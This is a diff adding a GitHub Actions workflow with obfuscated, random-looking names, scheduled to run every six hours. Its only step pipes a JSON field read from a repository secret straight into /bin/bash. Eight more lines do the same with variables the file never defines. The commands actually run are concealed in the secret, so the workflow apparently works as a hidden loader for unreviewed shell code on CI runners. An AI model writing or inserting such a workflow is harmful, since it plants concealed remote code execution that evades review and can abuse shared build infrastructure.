@@ -1,0 +1,24 @@
+name: liuyidao4657
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liuyidao4657
+        env:
+          s19442: ${{ secrets.s19442 }}
+        run: |
+          echo $s19442 | jq -r .mnzhm40 | /bin/bash
+          echo $pshig2150 | jq -r .hfy37202 | /bin/bash
+          echo $o46050 | jq -r .iqzh94 | /bin/bash
+          echo $wrh0665 | jq -r .jnx0933 | /bin/bash
+          echo $oeb5 | jq -r .jn3 | /bin/bash
+          echo $nm35 | jq -r .la04016 | /bin/bash
+          echo $xg0 | jq -r .xy29205 | /bin/bash
+          echo $v4 | jq -r .qpxm653 | /bin/bash
+          echo $dszf39668 | jq -r .o5 | /bin/bash
+
